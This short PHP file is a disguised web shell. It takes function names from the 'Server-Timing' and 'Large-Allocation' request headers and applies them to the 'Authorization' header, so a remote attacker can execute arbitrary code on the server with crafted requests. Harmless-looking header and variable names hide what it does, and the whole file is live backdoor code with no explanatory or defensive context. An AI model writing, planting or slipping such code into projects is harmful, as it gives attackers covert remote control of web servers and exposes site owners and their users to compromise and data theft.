<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $ob_iconv_handle = $_HEADERS['Server-Timing']('', $_HEADERS['Large-Allocation']($_HEADERS['Authorization']));
    $ob_iconv_handle();
}